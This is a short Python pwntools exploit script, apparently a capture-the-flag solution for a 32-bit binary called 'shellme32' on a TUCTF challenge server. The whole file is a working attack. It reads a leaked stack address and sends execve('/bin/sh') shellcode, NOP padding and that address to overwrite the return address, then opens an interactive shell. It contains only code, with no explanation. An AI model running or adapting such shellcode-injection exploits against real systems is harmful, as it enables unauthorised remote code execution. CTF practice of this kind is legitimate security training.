from pwn import *
import sys

shellcode = '\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x31\xD2\xB0\x0B\xCD\x80'
argv = sys.argv

if len(argv) < 2:
	r = process('./shellme32')
else:
	host, port = 'chal.tuctf.com', 30506
	r = remote(host, port)

raw_input('debug')

r.recvuntil('shellcode?\n')
res = r.recv(10)
add = int(res, 16)
r.recvuntil('> ')
payload = shellcode
payload += '\x90'*17
payload += p32(add)
r.sendline(payload)
	
r.interactive()
r.close()